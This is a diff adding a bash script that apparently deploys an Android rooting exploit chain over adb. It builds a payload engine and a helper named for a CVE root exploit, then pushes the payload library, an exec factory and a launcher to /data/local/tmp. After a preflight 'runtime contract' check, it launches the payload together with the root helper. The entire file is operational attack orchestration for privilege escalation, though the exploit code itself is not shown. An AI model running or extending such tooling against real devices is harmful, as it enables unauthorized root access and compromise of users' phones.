@@ -1,0 +1,44 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+case "${1:-}" in
+  "") check_only=0 ;;
+  --check-only) check_only=1 ;;
+  *) echo "Usage: $0 [--check-only]" >&2; exit 2 ;;
+esac
+[[ $# -le 1 ]] || { echo "Usage: $0 [--check-only]" >&2; exit 2; }
+
+repo_dir=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)
+engine=$repo_dir/targets/universal-WIP/brazilian-open-payload-engine
+helper=$repo_dir/targets/universal-WIP/helper
+contract=/tmp/universal/target.contract
+remote=/data/local/tmp/bope-universal
+
+"$repo_dir/tools/extract-btf-via-dirtyinit"
+python3 "$repo_dir/targets/universal-WIP/tools/build-contract.py"
+make -C "$engine" so all
+make -C "$helper" all
+
+adb push "$contract" "$remote.contract" >/dev/null
+adb push "$engine/build/app_main" "$remote-check" >/dev/null
+adb shell "chmod 600 $remote.contract; chmod 755 $remote-check"
+
+# This preflight checks exact identity and every runtime field before the launcher.
+check_result=$(adb shell "BOPE_TARGET_CONTRACT=$remote.contract BOPE_CONTRACT_CHECK_ONLY=1 $remote-check; echo BOPE_CHECK_EXIT:\$?")
+if [[ "$check_result" != *"BOPE_CHECK_EXIT:0"* ]]; then
+  printf '%s\n' "$check_result" >&2
+  exit 1
+fi
+echo "Runtime contract accepted by payload"
+if [[ "$check_only" == 1 ]]; then
+  exit 0
+fi
+
+adb push "$engine/build/payload.so" "$remote.so" >/dev/null
+adb push "$engine/build/mm-exec-factory" "$remote-factory" >/dev/null
+adb push "$engine/build/stability-launcher-universal" "$remote-launcher" >/dev/null
+adb push "$helper/build/cve-2026-43499-root" "$remote-helper" >/dev/null
+adb shell "chmod 755 $remote.so $remote-factory $remote-launcher $remote-helper"
+
+echo "Starting Stability Launcher with the verified runtime contract"
+adb shell "BOPE_TARGET_CONTRACT=$remote.contract $remote-launcher --payload $remote.so --helper $remote-helper --mm-factory $remote-factory"
